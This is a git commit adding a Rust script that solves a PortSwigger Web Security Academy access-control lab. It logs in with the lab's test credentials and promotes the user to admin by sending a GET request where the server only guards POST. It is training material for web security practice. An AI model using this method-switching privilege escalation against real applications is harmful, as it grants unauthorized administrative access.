b1eee6d99ec63629987bbbff3d9d0b2e8d348cfe
Ahmed Elqalawii <elqalawii@proton.me>
2023-09-05 21:57:07 +0300

    Added 'Method-based access control can be circumvented' lab

---
+++ Access control vulnerabilities/method_based_access_control_can_be_circumvented/src/main.rs
@@ -0,0 +1,110 @@
+/*************************************************************************
+*
+* Author: Ahmed Elqalawii
+*
+* Date: 5/9/2023
+*
+* PortSwigger LAB: Method-based access control can be circumvented
+*
+* Steps: 1. Login as wiener
+*        2. Upgrade wiener to be an admin via GET method instead of POST
+*
+**************************************************************************/
+#![allow(unused)]
+/***********
+* Imports
+***********/
+use regex::Regex;
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    header::HeaderMap,
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+/******************
+* Main Function
+*******************/
+fn main() {
+    // change this to your lab URL
+    let url = "https://0a2e009b0490978a8288c51100db0094.web-security-academy.net";
+    // build the client used in all subsequent requests
+    let client = build_client();
+
+    // login as wiener
+    print!("{} ", "1. Logging in as wiener..".white());
+    io::stdout().flush();
+    let login = client
+        .post(format!("{url}/login"))
+        .form(&HashMap::from([
+            ("username", "wiener"),
+            ("password", "peter"),
+        ]))
+        .send()
+        .expect(&format!("{}", "[!] Failed to login as wiener".red()));
+    println!("{}", "OK".green());
+    let session = extract_session_cookie(login.headers())
+        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
+
+    // Upgrade wiener to be an admin via GET method instead of POST
+    print!(
+        "{} ",
+        "2. Upgrading wiener to be an admin via GET method instead of POST..".white()
+    );
+    io::stdout().flush();
+    let upgrade_wiener = client
+        .get(format!("{url}/admin-roles?username=wiener&action=upgrade"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to upgrade wiener to be an admin".red()
+        ));
+    println!("{}", "OK".green());
+
+    println!(
+        "{} {}",
+        "[#] Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
+}
+
+/*******************************************************************
+ * Function used to build the client
+ * Return a client that will be used in all subsequent requests
+ ********************************************************************/
+fn build_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::none())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
+
+fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
+    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
+    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
+        Some(session.as_str().to_string())
+    } else {
+        None
+    }
+}
+
+/********************************************
+* Function to capture a pattern form a text
+*********************************************/
+fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
+    let pattern = Regex::new(pattern).unwrap();
+    if let Some(text) = pattern.captures(text) {
+        Some(text.get(1).unwrap().as_str().to_string())
+    } else {
+        None
+    }
+}
